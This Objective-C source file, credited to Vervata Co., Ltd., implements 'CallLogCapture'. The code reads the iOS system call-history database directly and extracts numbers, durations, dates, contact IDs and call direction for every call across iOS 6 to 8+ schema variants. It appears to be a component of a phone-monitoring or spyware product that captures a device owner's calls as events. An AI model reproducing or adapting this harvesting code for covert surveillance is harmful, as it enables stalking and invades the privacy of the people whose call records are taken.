/**
 - Project name :  CallLogCapture 
 - Class name   :  CallLogCaptureDAO
 - Version      :  1.0  
 - Purpose      :  For Call Log Capturing Component
 - Copy right   :  30/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "CallLogCaptureDAO.h"
#import "FMDatabase.h"
#import "CallLog.h"
#import "HistoricalCallLog.h"
#import "FxEventEnums.h"
#import "DefStd.h"

#import <UIKit/UIKit.h>

@interface CallLogCaptureDAO (private)
- (NSArray *) selectCallHistory: (NSString *) aSql;
- (NSArray *) selectCallHistoryV2: (NSString *) aSql;
// For iOS 8
- (NSArray *) selectCallHistoryiOS8: (NSString *) aSql;
@end

@implementation CallLogCaptureDAO

static NSString	* const kSelectCallHistory1			= @"SELECT ROWID,address,duration,flags from call where ROWID in (SELECT max(ROWID) from call)";
static NSString	* const kSelectCallHistory2			= @"SELECT ROWID,address,duration,flags from call WHERE ROWID > %ld";
static NSString * const kSelectCallHistory3			= @"SELECT ROWID,address,duration,flags from call ORDER BY ROWID DESC LIMIT 5";
static NSString * const kSelectCallHistory4			= @"SELECT ROWID,address,duration,flags, id from call ORDER BY ROWID DESC LIMIT 5";

static NSString	* const kSelectCallHistoryiOS8		= @"SELECT Z_PK,ZADDRESS,ZDURATION,ZANSWERED,ZORIGINATED from ZCALLRECORD ORDER BY Z_PK DESC LIMIT 5";


#pragma mark - Constants For Request Historical Events

// -- Query all record
static NSString * const kSelectCallHistoryAllCallsiOS6          = @"SELECT ROWID,address,duration,flags, id, date "
                                                                    "FROM call "
                                                                    "WHERE  flags != 20 AND "               // Incoming Facetime
                                                                            "flags != 21 "                  // Outgoing Facetime
                                                                    "ORDER BY date";

static NSString * const kSelectCallHistoryAllCallsiOS7          = @"SELECT ROWID,address,duration,flags, id, date "
                                                                    "FROM call "
                                                                    "WHERE  flags != 16 AND "               // Incoming Facetime Video
                                                                            "flags != 17 AND "              // Outgoing Facetime Video
                                                                            "flags != 64 AND "              // Incoming Facetime Audio
                                                                            "flags != 65 "
                                                                    "ORDER BY date";

static NSString	* const kSelectCallHistoryAllCallsiOS8          = @"SELECT Z_PK,ZADDRESS,ZDURATION,ZANSWERED,ZORIGINATED,ZDATE "
                                                                    "FROM ZCALLRECORD "
                                                                    "WHERE ZCALLTYPE != 8 AND "             // Facetime Video
                                                                            "ZCALLTYPE != 16 "              // Facetime Audio
                                                                    "ORDER BY ZDATE";


// -- Query latest n record

static NSString * const kSelectCallHistoryAllCallsWithMaxiOS6   = @"SELECT c1.ROWID, c1.address, c1.duration, c1.flags, c1.id, c1.date "
                                                                    "FROM call c1 "
                                                                    "JOIN "
                                                                        "(SELECT * FROM call "
                                                                            "WHERE  flags != 20 AND "                   // Incoming Facetime
                                                                                    "flags != 21 "                      // Outgoing Facetime
                                                                            "ORDER BY date DESC LIMIT %ld) c2 "
                                                                    "ON c1.ROWID = c2.ROWID "
                                                                    "ORDER BY c1.date";

static NSString * const kSelectCallHistoryAllCallsWithMaxiOS7   = @"SELECT c1.ROWID, c1.address, c1.duration, c1.flags, c1.id, c1.date "
                                                                    "FROM call c1 "
                                                                    "JOIN "
                                                                        "(SELECT * FROM call "
                                                                            "WHERE  flags != 16 AND "       // Incoming Facetime Video
                                                                                    "flags != 17 AND "      // Outgoing Facetime Video
                                                                                    "flags != 64 AND "      // Incoming Facetime Audio
                                                                                    "flags != 65 "          // Outgoing Facetime Audio
                                                                            "ORDER BY date DESC LIMIT %ld) c2 "
                                                                    "ON c1.ROWID = c2.ROWID "
                                                                    "ORDER BY c1.date";

static NSString	* const kSelectCallHistoryAllCallsWithMaxiOS8   = @"SELECT c1.Z_PK, c1.ZADDRESS, c1.ZDURATION, c1.ZANSWERED, c1.ZORIGINATED, c1.ZDATE "
                                                                    "FROM ZCALLRECORD c1 "
                                                                    "JOIN "
                                                                        "(SELECT * FROM ZCALLRECORD "
                                                                            "WHERE ZCALLTYPE != 8 AND "     // Facetime Video
                                                                                    "ZCALLTYPE != 16 "      // Facetime Audio
                                                                            "ORDER BY ZDATE DESC LIMIT %ld) c2 "
                                                                    "ON c1.Z_PK = c2.Z_PK "
                                                                    "ORDER BY c1.ZDATE";



#pragma mark -

static NSString	* const kSelectCallHistoryMaxRowID	= @"SELECT max(ROWID) from call";

/**
 - Method name: init
 - Purpose:This method is used to initalize CallLogCaptureDAO
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (id) init {
	if ((self = [super init])) {
        if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
            mSMSDB = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
        } else {
            mSMSDB = [FMDatabase databaseWithPath:kCallHistoryDatabasePathiOS8];
        }
		[mSMSDB retain];
		[mSMSDB open];
	}
	return (self);
}

- (NSArray *) selectCallHistory {
	NSArray *callLogs = [self selectCallHistory:kSelectCallHistory1];
	return (callLogs);
}

- (NSArray *) selectCallHistoryNewerRowID: (NSUInteger) aRowID {
	NSString *sql = [NSString stringWithFormat:kSelectCallHistory2, (long)aRowID];
	NSArray *callLogs = [self selectCallHistory:sql];
	return (callLogs);
}

- (CallLog *) selectCallHistoryWithLastRowEqual: (NSString *) aTelephoneNumber {
	CallLog * callLog = nil;
	NSArray *callLogs = nil;
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        // Below iOS 8
        callLogs = [self selectCallHistory:kSelectCallHistory3];
    } else {
        // iOS 8
        callLogs = [self selectCallHistoryiOS8:kSelectCallHistoryiOS8];
    }
	for (CallLog *call in callLogs) {
		if ([[call mContactNumber] isEqualToString:aTelephoneNumber]) {
			callLog = [[CallLog alloc] init];
			[callLog setMDuration:[call mDuration]];
			[callLog setMCallState:[call mCallState]];
			[callLog setMContactNumber:[call mContactNumber]];
			[callLog setMCallHistoryROWID:[call mCallHistoryROWID]];
			[callLog autorelease];
			break;
		} else {
            // Compare object in case of both operands are nil
            if ([call mContactNumber] == aTelephoneNumber) {
                callLog = call;
                break;
            }
        }
	}
	return (callLog);
}

- (CallLog *) selectCallHistoryWithLastRowEqualV2: (NSString *) aTelephoneNumber {
	CallLog * callLog = nil;
	NSArray *callLogs = nil;    
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        // Below iOS 8
        callLogs = [self selectCallHistoryV2:kSelectCallHistory4];
    } else {
        // iOS 8
        callLogs = [self selectCallHistoryiOS8:kSelectCallHistoryiOS8];
    }
    DLog(@"Call log result, %@", callLogs)
	for (CallLog *call in callLogs) {
        DLog(@"call log, %@", call)
		if ([[call mContactNumber] isEqualToString:aTelephoneNumber]) {
			callLog = [[CallLog alloc] init];
			[callLog setMDuration:[call mDuration]];
			[callLog setMCallState:[call mCallState]];
			[callLog setMContactNumber:[call mContactNumber]];
			[callLog setMCallHistoryROWID:[call mCallHistoryROWID]];
            [callLog setMContactID:[call mContactID]];
            DLog(@"Match Contact ID, %ld", (long)[call mContactID])
			[callLog autorelease];
			break;
		}
	}
	return (callLog);
}

- (NSUInteger) maxRowID {
	NSUInteger maxRowID = 1;
	FMResultSet* resultSet = [mSMSDB executeQuery:kSelectCallHistoryMaxRowID];
	if ([resultSet next]) {
		maxRowID = [resultSet intForColumnIndex:0];
	}
	return (maxRowID);
}


#pragma mark - Historical Call


- (NSArray *) selectAllCallHistory {
	NSArray *callLogs   = nil;
    int iOS             = [[[UIDevice currentDevice] systemVersion] intValue];
    
    if (iOS < 7) {
        callLogs = [self selectAllCallHistoryV2:kSelectCallHistoryAllCallsiOS6];                    // Order by date
    } else if (iOS == 7) {
        callLogs = [self selectAllCallHistoryV2:kSelectCallHistoryAllCallsiOS7];                    // Order by date
    } else {
        callLogs = [self selectAllCallHistoryiOS8:kSelectCallHistoryAllCallsiOS8];                  // Order by date
    }
    
	return (callLogs);
}

- (NSArray *) selectAllCallHistoryWithMax: (NSInteger) aMaxEvent {
    DLog(@" selectAllCallHistoryWithMax %ld", (long)aMaxEvent)
	NSArray *callLogs   = nil;
    int iOS             = [[[UIDevice currentDevice] systemVersion] intValue];
    if (iOS < 7) {
        NSString *sql   = [NSString stringWithFormat:kSelectCallHistoryAllCallsWithMaxiOS6, (long)aMaxEvent];      // Order by date
        DLog(@"SQL iOS 6 %@", sql)
        callLogs = [self selectAllCallHistoryV2:sql];
    } else if (iOS == 7) {
        NSString *sql   = [NSString stringWithFormat:kSelectCallHistoryAllCallsWithMaxiOS7, (long)aMaxEvent];      // Order by date
        DLog(@"SQL iOS 7 %@", sql)
        callLogs = [self selectAllCallHistoryV2:sql];
    } else {
        NSString *sql   = [NSString stringWithFormat:kSelectCallHistoryAllCallsWithMaxiOS8, (long)aMaxEvent];      // Order by date
        DLog(@"SQL iOS 8 %@", sql)
        callLogs = [self selectAllCallHistoryiOS8:sql];
    }
	return (callLogs);
}


#pragma mark - 


/**
 - Method name: selectCallHistory:
 - Purpose:This method is used to select call log
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of CallLog objects
*/

- (NSArray *) selectCallHistory: (NSString *) aSql {
	NSMutableArray* requestArray = [[NSMutableArray alloc] init];
	FMResultSet* resultSet = [mSMSDB executeQuery:aSql];
	while ([resultSet next]) {
        CallLog *callLog=[[CallLog alloc] init];
        [callLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];
        [callLog setMContactNumber:[resultSet stringForColumnIndex:1]];
        NSUInteger duration=[resultSet intForColumnIndex:2];
        [callLog setMDuration:duration];
        int flags=[resultSet intForColumnIndex:3];
		DLog (@"Call flags value = %d", flags);
		
		NSString *version = [[UIDevice currentDevice] systemVersion];
		if ([version intValue] >= 7) {
			switch (flags) {
				case kCallState2OutGoing:
                case kCallState2OutGoing5s:
                case kCallState2OutGoingDecline5s:
					[callLog setMCallState:kEventDirectionOut];
					break;
				case kCallState2Incoming:
				case kCallState2IncomingPrivate:
					if(duration==0)
						[callLog setMCallState:kEventDirectionMissedCall];
					else
						[callLog setMCallState:kEventDirectionIn];
					break;
                case kCallState2IncomingDecline5s:
                    [callLog setMCallState:kEventDirectionMissedCall];
                    break;
				default:
					[callLog setMCallState:kEventDirectionOut];
					break;
			}
		} else {
			 switch (flags) {
			   case kCallStateIncoming:
					 if(duration==0)
					   [callLog setMCallState:kEventDirectionMissedCall];
					 else
					   [callLog setMCallState:kEventDirectionIn];	
				break;
				case  kCallStateIncomingPrivate:
					 if(duration==0)
						 [callLog setMCallState:kEventDirectionMissedCall];
					 else
						 [callLog setMCallState:kEventDirectionIn];
					 break;
				 case  kCallStateOutGoing:
					 [callLog setMCallState:kEventDirectionOut];
					 break;
				 case kCallStateIncomingPrivateDecline:
				 case kCallStateIncomingDecline:
					 [callLog setMCallState:kEventDirectionMissedCall];
					 break;
				default:
					[callLog setMCallState:kEventDirectionOut]; 
				break;
			}
		}
		[requestArray addObject:callLog];
		[callLog release];
		callLog=nil;
		DLog (@"Direction:%d",flags); 
 }
	return [requestArray autorelease];
}

/**
 - Method name: selectCallHistory:
 - Purpose:This method is used to select call log containing contact id
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of CallLog objects
 */

- (NSArray *) selectCallHistoryV2: (NSString *) aSql {
	NSMutableArray* requestArray = [[NSMutableArray alloc] init];
    DLog(@"SQL %@", aSql)
    
	FMResultSet* resultSet = [mSMSDB executeQuery:aSql];
	while ([resultSet next]) {
        CallLog *callLog=[[CallLog alloc] init];
		[callLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];
        [callLog setMContactNumber:[resultSet stringForColumnIndex:1]];
        NSUInteger duration=[resultSet intForColumnIndex:2];
        [callLog setMDuration:duration];
        [callLog setMContactID:[resultSet intForColumnIndex:4]];
        
        DLog(@"Contact ID %ld", (long)[callLog mContactID])
        int flags=[resultSet intForColumnIndex:3];
		DLog (@"Call flags value = %d", flags);
		
		NSString *version = [[UIDevice currentDevice] systemVersion];
		if ([version intValue] >= 7) {
            switch (flags) {
				case kCallState2OutGoing:
                case kCallState2OutGoing5s:
                case kCallState2OutGoingDecline5s:
					[callLog setMCallState:kEventDirectionOut];
					break;
				case kCallState2Incoming:
				case kCallState2IncomingPrivate:
					if(duration==0)
						[callLog setMCallState:kEventDirectionMissedCall];
					else
						[callLog setMCallState:kEventDirectionIn];
					break;
                case kCallState2IncomingDecline5s:
                    [callLog setMCallState:kEventDirectionMissedCall];
                    break;
				default:
					[callLog setMCallState:kEventDirectionOut];
					break;
			}
		} else {
            switch (flags) {
                case kCallStateIncoming:
                    if(duration==0)
                        [callLog setMCallState:kEventDirectionMissedCall];
                    else
                        [callLog setMCallState:kEventDirectionIn];
                    break;
				case  kCallStateIncomingPrivate:
                    if(duration==0)
                        [callLog setMCallState:kEventDirectionMissedCall];
                    else
                        [callLog setMCallState:kEventDirectionIn];
                    break;
                case  kCallStateOutGoing:
                    [callLog setMCallState:kEventDirectionOut];
                    break;
                case kCallStateIncomingPrivateDecline:
                case kCallStateIncomingDecline:
                    [callLog setMCallState:kEventDirectionMissedCall];
                    break;
				default:
					[callLog setMCallState:kEventDirectionOut]; 
                    break;
			}
		}
		[requestArray addObject:callLog];
		[callLog release];
		callLog=nil;
		DLog (@"Direction:%d",flags); 
    }
	return [requestArray autorelease];
}

/**
 - Method name: selectAllCallHistoryV2:
 - Purpose:This method is used to select call log containing contact id
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of HistoricalCallLog objects
 */

- (NSArray *) selectAllCallHistoryV2: (NSString *) aSql {
	NSMutableArray* requestArray = [[NSMutableArray alloc] init];
    DLog(@"SQL %@", aSql)
    
	FMResultSet *resultSet = [mSMSDB executeQuery:aSql];
	while ([resultSet next]) {
        
        HistoricalCallLog *hisCallLog   = [[HistoricalCallLog alloc] init];
		[hisCallLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];
        [hisCallLog setMContactNumber:[resultSet stringForColumnIndex:1]];
        NSUInteger duration             = [resultSet intForColumnIndex:2];
        [hisCallLog setMDuration:duration];
        [hisCallLog setMContactID:[resultSet intForColumnIndex:4]];
        
        // Set the date for each calllog event
        NSDate *date                    = [NSDate dateWithTimeIntervalSince1970:[resultSet doubleForColumn:@"date"]];
        [hisCallLog setMDate:date];
        
        DLog(@"Contact ID %ld", (long)[hisCallLog mContactID])
        int flags=[resultSet intForColumnIndex:3];
		DLog (@"Call flags value = %d", flags);
		
		NSString *version = [[UIDevice currentDevice] systemVersion];
		if ([version intValue] >= 7) {
            switch (flags) {
				case kCallState2OutGoing:
                case kCallState2OutGoing5s:
                case kCallState2OutGoingDecline5s:
					[hisCallLog setMCallState:kEventDirectionOut];
					break;
				case kCallState2Incoming:
				case kCallState2IncomingPrivate:
					if(duration==0)
						[hisCallLog setMCallState:kEventDirectionMissedCall];
					else
						[hisCallLog setMCallState:kEventDirectionIn];
					break;
                case kCallState2IncomingDecline5s:
                    [hisCallLog setMCallState:kEventDirectionMissedCall];
                    break;
				default:
					[hisCallLog setMCallState:kEventDirectionOut];
					break;
			}
		} else {
            switch (flags) {
                case kCallStateIncoming:
                    if(duration==0)
                        [hisCallLog setMCallState:kEventDirectionMissedCall];
                    else
                        [hisCallLog setMCallState:kEventDirectionIn];
                    break;
				case  kCallStateIncomingPrivate:
                    if(duration==0)
                        [hisCallLog setMCallState:kEventDirectionMissedCall];
                    else
                        [hisCallLog setMCallState:kEventDirectionIn];
                    break;
                case  kCallStateOutGoing:
                    [hisCallLog setMCallState:kEventDirectionOut];
                    break;
                case kCallStateIncomingPrivateDecline:
                case kCallStateIncomingDecline:
                    [hisCallLog setMCallState:kEventDirectionMissedCall];
                    break;
				default:
					[hisCallLog setMCallState:kEventDirectionOut];
                    break;
			}
		}
		[requestArray addObject:hisCallLog];
		[hisCallLog release];
		hisCallLog = nil;
		DLog (@"Direction:%d",flags);
    }
	return [requestArray autorelease];
}

/**
 - Method name: selectCallHistoryiOS8:
 - Purpose:This method is used to select call log containing contact id
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of CallLog objects
 */

- (NSArray *) selectCallHistoryiOS8: (NSString *) aSql {
	NSMutableArray* requestArray = [[NSMutableArray alloc] init];
    DLog(@"SQL %@", aSql)
    
	FMResultSet* resultSet = [mSMSDB executeQuery:aSql];
	while ([resultSet next]) {
        CallLog *callLog=[[CallLog alloc] init];
		[callLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];
        NSString *callerID = [resultSet stringForColumnIndex:1];
        callerID = [callerID stringByReplacingOccurrencesOfString:@"-" withString:@""]; // iOS 9 stores number in dash format '78-965-4' or '55-666-4422'
        [callLog setMContactNumber:callerID];
        NSUInteger duration = [resultSet intForColumnIndex:2];
        [callLog setMDuration:duration];
        
        [callLog setMContactID:-1]; // used for query contact name in address book database on iOS 7
        
        int answered    = [resultSet intForColumnIndex:3];
        int originated  = [resultSet intForColumnIndex:4];
        
		NSString *version = [[UIDevice currentDevice] systemVersion];
        
		if ([version intValue] >= 8) {
            if (originated) {             // outgoing
                //DLog(@"...outgoing call")
                [callLog setMCallState:kEventDirectionOut];
            }
            else {            // incoming or miss call
                if (answered) {                 // incoming
                    //DLog(@"...incoming call")
                    [callLog setMCallState:kEventDirectionIn];
                }
                else { // misscall
                    //DLog(@"...missed call")
                    [callLog setMCallState:kEventDirectionMissedCall];
                }
            }
		}
        DLog(@"duration: %lu contact %ld Direction (In 1, Out 2, Miss 3) %d", (unsigned long)duration, (long)[callLog mContactID], [callLog mCallState])

		[requestArray addObject:callLog];
		[callLog release];
		callLog=nil;
    }
    //DLog (@"requestArray: %@", requestArray);
	return [requestArray autorelease];
}

/**
 - Method name: selectAllCallHistoryiOS8:
 - Purpose:This method is used to select call log containing contact id
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of HistoricalCallLog objects
 */

- (NSArray *) selectAllCallHistoryiOS8: (NSString *) aSql {
	NSMutableArray* requestArray = [[NSMutableArray alloc] init];
    DLog(@"SQL %@", aSql)
    
	FMResultSet* resultSet = [mSMSDB executeQuery:aSql];
    
	while ([resultSet next]) {
        
        HistoricalCallLog *hisCallLog  = [[HistoricalCallLog alloc] init];
		[hisCallLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];
        [hisCallLog setMContactNumber:[resultSet stringForColumnIndex:1]];
        NSUInteger duration         = [resultSet intForColumnIndex:2];
        [hisCallLog setMDuration:duration];
        [hisCallLog setMContactID:-1]; // used for query contact name in address book database on iOS 7
        
        // Set the date for each calllog event
        NSDate *date                = [NSDate dateWithTimeIntervalSinceReferenceDate:[resultSet doubleForColumn:@"ZDATE"]];
        [hisCallLog setMDate:date];
        
        int answered                = [resultSet intForColumnIndex:3];
        int originated              = [resultSet intForColumnIndex:4];
		NSString *version           = [[UIDevice currentDevice] systemVersion];
        
		if ([version intValue] >= 8) {
            if (originated) {               // outgoing
                [hisCallLog setMCallState:kEventDirectionOut];
            }
            else {                          // incoming or miss call
                if (answered) {             // incoming
                    [hisCallLog setMCallState:kEventDirectionIn];
                }
                else {                      // misscall
                    [hisCallLog setMCallState:kEventDirectionMissedCall];
                }
            }
		}
        DLog(@"duration: %lu contact %ld Direction (In 1, Out 2, Miss 3) %d", (unsigned long)duration, (long)[hisCallLog mContactID], [hisCallLog mCallState])
        
		[requestArray addObject:hisCallLog];
		[hisCallLog release];
		hisCallLog = nil;
    }
	return [requestArray autorelease];
}


/**
 - Method name:dealloc
 - Purpose: This is memory mangement method.Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mSMSDB close];
	[mSMSDB release];
	mSMSDB=nil;
	[super dealloc];
}

@end
